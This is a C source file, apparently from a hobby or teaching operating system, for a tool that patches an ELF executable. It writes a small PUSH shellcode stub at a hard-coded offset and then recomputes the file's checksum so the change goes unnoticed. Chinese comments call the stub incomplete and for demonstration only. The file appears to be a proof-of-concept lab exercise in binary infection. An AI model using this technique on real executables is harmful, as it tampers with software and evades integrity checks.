#include "sys/const.h"
#include "stdio.h"
#include "string.h"
#include "type.h"
// #include "syscall.h"
// #include "log.h"
#include "elf.h"

int set_checksum(const char *pathname, int checksum);

#define PAGESIZE 4096


/* 函数声明 */
void cal_addr(int entry, int addr[]);
void inject(char* elf_file);
void insert(Elf32_Ehdr elf_ehdr, char* elf_file, int old_entry);
u8 popcount8(u8 b);
u8 accumulate_checksum(const u8 * buf, int len, u8 seed);
int calc_checksum_fd(int fd, int total_len);

/* 打印帮助信息 */
void help() {
    printf("Usage: inject <file>\n");
}

/* 主函数：解析命令行参数并调用相应的 POC */
int main(int argc, char *argv[]) {
    inject(argv[1]); // 直接执行 ELF 注入
    return 0;
}

/* 将整数地址转换为 4 个字节的数组（小端序） */
void cal_addr(int entry, int addr[]) {
    int temp = entry;
    int i;
    for (i = 0; i < 4; i++) {
        addr[i] = temp % 256;
        temp /= 256;
    }
}

/* 注入逻辑的主要入口 */
void inject(char* elf_file) {
    printf("start to inject...\n");

    int old_entry;
    Elf32_Ehdr elf_ehdr;
    Elf32_Phdr elf_phdr;

    /* 1. 读取 ELF 文件头 */
    int old_file = open(elf_file, O_RDWR);
    read(old_file, &elf_ehdr, sizeof(Elf32_Ehdr));
    old_entry = elf_ehdr.e_entry; // 保存原始入口地址
    printf("old_entry: %x\n", old_entry);

    int i = 0;

    printf("Modifying the program header table...\n");
    /* 2. 读取程序头表 (Program Header Table) */
    close(old_file);
    old_file = open(elf_file, O_RDWR);
    char buffer[20000];
    // 读取直到程序头表偏移位置的数据（这里只是为了移动文件指针或者缓存？）
    // 注意：这里 buffer 大小固定，如果 e_phoff 很大可能会溢出
    read(old_file, buffer, elf_ehdr.e_phoff); 
    read(old_file, &elf_phdr, sizeof(elf_phdr)); // 读取第一个程序头

    printf("Inserting the injector...\n");
    /* 3. 执行实际的插入操作 */
    close(old_file);
    insert(elf_ehdr, elf_file, old_entry);
}

/* 执行代码插入和文件修改 */
void insert(Elf32_Ehdr elf_ehdr, char* elf_file, int old_entry) {
    // 将原始入口地址转换为字节数组，以便嵌入到 shellcode 中
    int old_entry_addr[4];
    cal_addr(old_entry, old_entry_addr);

    printf("old_entry = 0x%x%x%x%x\n", old_entry_addr[3],old_entry_addr[2],old_entry_addr[1],old_entry_addr[0]);
    
    /* 
     * 注入的 Shellcode 代码 
     * 0x68 是 PUSH 指令的操作码
     * 这里似乎只是一个简单的示例，Push 了一个地址，但没有完整的跳转逻辑？
     * 通常这里会是: PUSH old_entry; RET; 或者 JMP old_entry;
     * 这里的代码看起来不完整，仅作演示用途。
     */
    char inject_code[] = {
        0x68,       // PUSH
        0x00,       // Address byte 1
        0x20,       // Address byte 2
        0x00,       // Address byte 3
        0x00        // Address byte 4
    };
    int inject_size = sizeof(inject_code);

    // 防止注入代码太大超过一页
    if (inject_size > PAGESIZE) {
        printf("Injecting code is too big!\n");
        exit(0);
    }

    /* 4. 写入注入代码 */
    // 这里假设注入点在文件偏移 0x1024 处？
    // 注意：这种硬编码偏移的方式非常危险，仅适用于特定的 ELF 文件结构
    int old_file = open(elf_file, O_RDWR);
    u8 buffer[20000];
    read(old_file, buffer, 0x1024); // 跳过前 0x1024 字节
    write(old_file, inject_code, inject_size); // 写入 shellcode
    close(old_file);

    /* 5. 验证写入结果 (可选) */
    old_file = open(elf_file, O_RDWR);
    read(old_file, buffer, 0x1024);
    read(old_file, buffer, 5);
    for (int i = 0; i < 5; i++) {
        printf("%x\n", buffer[i]);
    }
    close(old_file);

    /* 6. 计算并更新文件校验和 */
    // update md5
    int fd = open(elf_file, O_RDWR);

    struct stat s;

    int checksum_value = 0; 
    if (stat(elf_file, &s) == 0) {
        checksum_value = calc_checksum_fd(fd, s.st_size);

    }

    set_checksum(elf_file, checksum_value);

    close(fd);
    printf("Finished!\n");
}

u8 popcount8(u8 b)
{
	u8 cnt = 0;
	while (b) {
		cnt += b & 0x1;
		b >>= 1;
	}
	return cnt;
}

u8 accumulate_checksum(const u8 * buf, int len, u8 seed)
{
	for (int i = 0; i < len; i++) {
		seed ^= popcount8(buf[i]);
	}
	return seed;
}

int calc_checksum_fd(int fd, int total_len)
{
	u8 buf[SECTOR_SIZE];
	int left = total_len;
	u8 checksum = 0;

	if (lseek(fd, 0, SEEK_SET) < 0)
		return -1;

	while (left > 0) {
		int to_read = min((int)sizeof(buf), left);
		int r = read(fd, buf, to_read);
		if (r != to_read)
			return -1;
		checksum = accumulate_checksum(buf, r, checksum);
		left -= r;
	}

	/* rewind for callers that reuse the fd */
	lseek(fd, 0, SEEK_SET);

	return checksum;
}

